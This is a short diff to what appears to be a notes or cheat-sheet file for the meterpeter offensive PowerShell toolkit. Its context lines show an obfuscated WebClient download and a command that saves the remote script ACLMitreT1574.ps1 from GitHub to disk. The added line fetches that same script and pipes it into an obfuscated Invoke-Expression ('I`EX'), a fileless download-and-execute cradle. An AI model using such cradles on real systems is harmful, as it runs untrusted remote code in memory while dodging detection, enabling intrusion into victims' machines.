@@ -2143,6 +2143,8 @@ $w=(New-Object Net.WebClient);$w.(((($w).PsObject.Methods)|?{(Item Variable:\_).
 
 [IO.StreamReader]::new([Net.WebRequest]::Create('https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1').GetResponse().GetResponseStream()).ReadToEnd() > test.ps1
 
+[IO.StreamReader]::new([Net.WebRequest]::Create('https://raw.githubusercontent.com/r00t-3xp10it/meterpeter/master/mimiRatz/ACLMitreT1574.ps1').GetResponse().GetResponseStream()).ReadToEnd() | I`EX
+
 ```
       
 ![rf](https://user-images.githubusercontent.com/23490060/94825488-29098b80-03fe-11eb-8ea9-1caca3ab7b4e.png)
